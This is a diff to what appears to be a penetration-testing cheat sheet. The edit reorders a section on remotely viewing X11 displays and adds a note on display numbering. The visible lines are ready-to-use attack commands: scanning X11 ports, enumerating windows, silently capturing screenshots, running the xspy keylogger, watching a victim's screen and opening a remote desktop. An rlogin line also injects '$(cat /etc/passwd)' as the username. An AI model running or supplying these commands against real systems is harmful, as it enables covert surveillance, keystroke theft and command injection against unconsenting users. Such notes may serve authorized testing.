@@ -855,7 +855,11 @@ rlogin -l "$(cat /etc/passwd)" -p port <target IP>
 nmap -Pn -n -T4 --open -p6000-6009 <target IP>
 
 - Gather window info
+Port 6001 = display 1
 xwininfo -root -tree -display <target IP:display #>
+
+- Remotely view
+xwatchwin <target IP:display #> -w <ID>
 
 - Capture screenshot
 xwd -root -screen -silent -display <target IP:display #> > 1.xwd
@@ -865,9 +869,6 @@ display 1.png
 - Keylogger
 xspy -display <target IP:display #>
 If Kali's version does not work, you may need to compile from source https://github.com/mnp/xspy
-
-- Remotely view
-xwatchwin <target IP:display #> -w <ID>
 
 - Remote Desktop
 xrdp.py <target IP:display #>
